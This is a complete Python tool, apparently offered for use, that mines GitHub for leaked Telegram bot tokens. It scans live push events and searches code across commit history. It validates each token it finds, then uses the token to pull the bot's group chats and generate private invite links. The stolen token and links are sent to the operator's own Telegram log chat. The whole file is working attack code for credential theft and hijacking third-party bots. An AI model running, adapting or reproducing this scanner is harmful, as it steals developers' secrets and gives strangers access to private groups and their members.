import asyncio, aiohttp, re, base64, random
from telethon import TelegramClient
from aiolimiter import AsyncLimiter
from config import Config

# --- [ GLOBAL CACHE & SPEED ] ---
PROCESSED_TOKENS = set()
# Har extension aur har tarah ki config file target par hai
EXTENSIONS = ['env', 'php', 'js', 'json', 'yml', 'py', 'sh', 'sql', 'ini', 'conf', 'bak']
KEYWORDS = ['bot_token', 'tg_token', 'api_key', '8048749705']
TOKEN_REGEX = r'[0-9]{10}:[a-zA-Z0-9_-]{35}'

client = TelegramClient('singularity_x', Config.API_ID, Config.API_HASH).start(bot_token=Config.BOT_TOKEN)
# Speed 2000 requests per second tak push ki hai
limiter = AsyncLimiter(2000, 1)

async def validate_and_hijack(token, source, method):
    if token in PROCESSED_TOKENS:
        return
    
    async with aiohttp.ClientSession() as session:
        try:
            # God-Level Validation
            async with session.get(f"https://api.telegram.org/bot{token}/getMe") as r:
                if r.status == 200:
                    PROCESSED_TOKENS.add(token)
                    bot_data = (await r.json())['result']
                    
                    # Group & Admin Intelligence
                    links = []
                    async with session.get(f"https://api.telegram.org/bot{token}/getUpdates") as up:
                        u_data = await up.json()
                        if u_data.get("ok"):
                            for item in u_data["result"]:
                                chat = item.get("message", {}).get("chat", {})
                                if chat.get("type") in ["group", "supergroup"]:
                                    cid = chat["id"]
                                    # Private link generate karke nikalna
                                    async with session.get(f"https://api.telegram.org/bot{token}/exportChatInviteLink?chat_id={cid}") as inv:
                                        res = await inv.json()
                                        if res.get("ok"): links.append(f"🏰 {chat.get('title')}: {res['result']}")

                    report = (f"🔥 **SINGULARITY HIT: {method}**\n\n"
                              f"👤 **Bot:** @{bot_data['username']}\n"
                              f"🔑 **Token:** `{token}`\n"
                              f"🔗 **Source:** {source}\n\n"
                              f"🔓 **Invite Links:**\n" + ("\n".join(links) if links else "Direct access only."))
                    await client.send_message(Config.LOG_CHAT, report)
        except: pass

async def deep_blame_scanner(session, item, gh_token):
    """File ki poori history (Commits) ko nichodna"""
    headers = {"Authorization": f"token {gh_token}"}
    try:
        repo = item['repository']['full_name']
        path = item['path']
        # 10x Deep Scan: Last 10 commits check karega
        async with session.get(f"https://api.github.com/repos/{repo}/commits?path={path}", headers=headers) as r:
            commits = await r.json()
            if not isinstance(commits, list): return
            
            for c in commits[:10]:
                raw_url = f"https://raw.githubusercontent.com/{repo}/{c['sha']}/{path}"
                async with session.get(raw_url, headers=headers) as rr:
                    text = await rr.text()
                    for t in set(re.findall(TOKEN_REGEX, text)):
                        await validate_and_hijack(t, item['html_url'], "DEEP_BLAME")
    except: pass

async def singularity_engine():
    print("💀 SINGULARITY-X IS ONLINE. TOTAL INTERNET CONSUMPTION STARTED.")
    async with aiohttp.ClientSession() as session:
        while True:
            gh_token = random.choice(Config.GH_TOKENS).strip()
            
            # Task 1: Real-Time Event Monitoring
            url_events = "https://api.github.com/events"
            try:
                async with session.get(url_events, headers={"Authorization": f"token {gh_token}"}) as r:
                    events = await r.json()
                    for event in events:
                        if event['type'] == 'PushEvent':
                            repo = event['repo']['name']
                            for commit in event['payload'].get('commits', []):
                                async with session.get(commit['url'], headers={"Authorization": f"token {gh_token}"}) as cr:
                                    c_data = await cr.json()
                                    for file in c_data.get('files', []):
                                        patch = file.get('patch', '')
                                        for t in set(re.findall(TOKEN_REGEX, patch)):
                                            await validate_and_hijack(t, f"https://github.com/{repo}", "REALTIME_PUSH")
            except: pass

            # Task 2: Global Search with Recursive Blame
            ext = random.choice(EXTENSIONS)
            key = random.choice(KEYWORDS)
            search_url = f"https://api.github.com/search/code?q=extension:{ext}+{key}&sort=indexed&order=desc"
            try:
                async with session.get(search_url, headers={"Authorization": f"token {gh_token}"}) as r:
                    if r.status == 200:
                        data = await r.json()
                        tasks = [deep_blame_scanner(session, item, gh_token) for item in data.get('items', [])]
                        await asyncio.gather(*tasks)
            except: pass
            
            await asyncio.sleep(1)

if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(singularity_engine())
